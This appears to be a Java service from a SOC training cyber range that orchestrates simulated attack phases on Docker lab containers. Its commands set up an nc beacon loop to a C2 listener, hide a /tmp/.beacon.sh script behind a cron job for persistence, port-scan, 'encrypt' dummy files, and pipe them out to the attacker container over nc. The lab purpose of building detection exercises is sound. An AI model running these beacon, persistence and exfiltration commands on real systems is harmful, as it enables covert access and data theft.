package com.minisoc.lab.executor;

import com.minisoc.lab.model.AttackPhase;
import com.minisoc.lab.model.CommandResult;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import java.util.Map;

/**
 * Orchestrates Red Team attacks by executing commands on Docker containers.
 *
 * Each attack phase maps to specific system-level actions:
 *   INITIAL_ACCESS   → spawn beacon loop / reverse shell (attacker → victim)
 *   PERSISTENCE      → install cron job on victim
 *   LATERAL_MOVEMENT → probe/spread from attacker
 *   EXFILTRATION     → simulate data theft / ransomware on victim
 *
 * The backend acts as the orchestrator that decides WHEN to attack,
 * executing commands on both attacker and victim containers via docker exec.
 */
@Service
public class AttackExecutor {

    private static final Logger log = LoggerFactory.getLogger(AttackExecutor.class);

    private final SystemCommandExecutor commandExecutor;

    @Value("${cyber-range.victim.container:soc-victim}")
    private String victimContainer;

    @Value("${cyber-range.attacker.container:soc-attacker}")
    private String attackerContainer;

    @Value("${cyber-range.victim.hostname:victim}")
    private String victimHostname;

    @Value("${cyber-range.c2.port:4444}")
    private int c2Port;

    public AttackExecutor(SystemCommandExecutor commandExecutor) {
        this.commandExecutor = commandExecutor;
    }

    /**
     * Execute the attack for the given phase.
     * Returns result details including what was launched.
     */
    public Map<String, Object> executePhaseAttack(AttackPhase phase) {
        if (victimContainer == null || victimContainer.isBlank()) {
            log.warn("No victim container configured — attack skipped (cyber-range.victim.container)");
            return Map.of("success", false, "reason", "No victim container configured");
        }

        return switch (phase) {
            case INITIAL_ACCESS -> executeInitialAccess();
            case PERSISTENCE -> executePersistence();
            case LATERAL_MOVEMENT -> executeLateralMovement();
            case EXFILTRATION -> executeExfiltration();
            case CONTAINED -> Map.of("success", false, "reason", "Attack contained — no action");
        };
    }

    /**
     * Phase 1: Spawn a persistent beacon loop.
     * This creates a process that:
     *  - Runs in a loop
     *  - Attempts to beacon to C2
     *  - Respawns if individual iteration is killed (loop persists)
     *  - Is detectable by process monitoring
     */
    private Map<String, Object> executeInitialAccess() {
        // Start C2 listener on attacker container first
        String listenerCmd = String.format(
                "(nc -lkp %d > /dev/null 2>&1 &) && echo listener_started", c2Port);
        commandExecutor.executeAsync(attackerContainer, listenerCmd);

        // Beacon loop on victim: attempts nc connection to attacker every 5s
        // Uses bash -c so entire cmdline is visible to ps/monitoring
        String command = String.format(
                "while true; do echo beacon | nc -w 2 %s %d 2>/dev/null; sleep 5; done",
                attackerContainer, c2Port
        );

        CommandResult result = commandExecutor.executeAsync(victimContainer, command);
        log.info("ATTACK [INITIAL_ACCESS]: beacon loop → {}", result.success() ? "launched" : "failed");

        return Map.of(
                "success", result.success(),
                "phase", "INITIAL_ACCESS",
                "action", "beacon_loop",
                "target", victimContainer,
                "c2", attackerContainer + ":" + c2Port,
                "details", result.success() ? "Beacon loop spawned on victim → attacker C2" : result.stderr()
        );
    }

    /**
     * Phase 2: Install persistence via cron job.
     * Creates a beacon script in /tmp and schedules it via crontab.
     */
    private Map<String, Object> executePersistence() {
        // Drop beacon script on victim (post-exploitation)
        String dropScript = String.format(
                "echo '#!/bin/bash\necho beacon | nc -w 2 %s %d 2>/dev/null' > /tmp/.beacon.sh && chmod +x /tmp/.beacon.sh",
                attackerContainer, c2Port
        );
        commandExecutor.execute(victimContainer, dropScript);

        // Add cron job (every 5 minutes)
        String cronCommand = "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.beacon.sh') | crontab -";
        CommandResult result = commandExecutor.execute(victimContainer, cronCommand);

        log.info("ATTACK [PERSISTENCE]: cron job → {}", result.success() ? "installed" : "failed");

        return Map.of(
                "success", result.success(),
                "phase", "PERSISTENCE",
                "action", "cron_persistence",
                "target", victimContainer,
                "details", result.success() ? "Cron job installed + beacon script dropped" : result.stderr()
        );
    }

    /**
     * Phase 3: Simulate lateral movement.
     * Probe other hosts/ports from the victim.
     */
    private Map<String, Object> executeLateralMovement() {
        // Scan from attacker container — probe victim and local Docker network
        String command = String.format(
                "for port in 22 80 443 445 8080; do " +
                "(echo scan | nc -w 1 %s $port 2>/dev/null && echo \"OPEN:%s:$port\") & " +
                "done; " +
                "for port in 22 80 8080; do " +
                "(echo scan | nc -w 1 backend $port 2>/dev/null && echo \"OPEN:backend:$port\") & " +
                "done; wait",
                victimHostname, victimHostname);

        CommandResult result = commandExecutor.execute(attackerContainer, command);
        log.info("ATTACK [LATERAL_MOVEMENT]: network probe → {}", result.success() ? "complete" : "failed");

        return Map.of(
                "success", result.success(),
                "phase", "LATERAL_MOVEMENT",
                "action", "network_probe",
                "target", attackerContainer,
                "details", result.success() ? "Lateral probe completed: " + result.stdout() : result.stderr()
        );
    }

    /**
     * Phase 4: Simulate data exfiltration / ransomware.
     * Create dummy sensitive files and encrypt (rename) them.
     */
    private Map<String, Object> executeExfiltration() {
        // Create and "encrypt" files on victim
        String command = "mkdir -p /tmp/exfil_data && " +
                "for i in $(seq 1 5); do echo 'CONFIDENTIAL DATA '$i > /tmp/exfil_data/doc_$i.txt; done && " +
                "for f in /tmp/exfil_data/*.txt; do mv \"$f\" \"$f.encrypted\"; done";

        CommandResult result = commandExecutor.execute(victimContainer, command);

        // Also simulate exfil by curling data to attacker
        if (result.success()) {
            String exfilCmd = String.format(
                    "cat /tmp/exfil_data/*.encrypted | nc -w 2 %s 9999 2>/dev/null || true",
                    attackerContainer);
            commandExecutor.executeAsync(victimContainer, exfilCmd);
        }

        log.info("ATTACK [EXFILTRATION]: ransomware sim → {}", result.success() ? "executed" : "failed");

        return Map.of(
                "success", result.success(),
                "phase", "EXFILTRATION",
                "action", "ransomware_simulation",
                "target", victimContainer,
                "details", result.success() ? "Files encrypted in /tmp/exfil_data/" : result.stderr()
        );
    }

    /**
     * Clean up all attack artifacts from the victim.
     * Used when resetting the game.
     */
    public CommandResult cleanup() {
        if (victimContainer == null || victimContainer.isBlank()) {
            return CommandResult.error("", "cleanup", "No victim container configured");
        }

        // Clean up victim container
        String victimCleanup = "pkill -f 'while true.*beacon' 2>/dev/null; " +
                "pkill -f '.beacon.sh' 2>/dev/null; " +
                "crontab -r 2>/dev/null; " +
                "rm -f /tmp/.beacon.sh 2>/dev/null; " +
                "rm -rf /tmp/exfil_data 2>/dev/null; " +
                "echo 'cleanup complete'";

        CommandResult result = commandExecutor.execute(victimContainer, victimCleanup);

        // Clean up attacker container (kill C2 listener)
        String attackerCleanup = "pkill -f 'nc -lkp' 2>/dev/null; echo 'attacker cleanup complete'";
        commandExecutor.execute(attackerContainer, attackerCleanup);

        return result;
    }

    public String getVictimContainer() {
        return victimContainer;
    }

    public String getAttackerContainer() {
        return attackerContainer;
    }

    public SystemCommandExecutor getCommandExecutor() {
        return commandExecutor;
    }
}
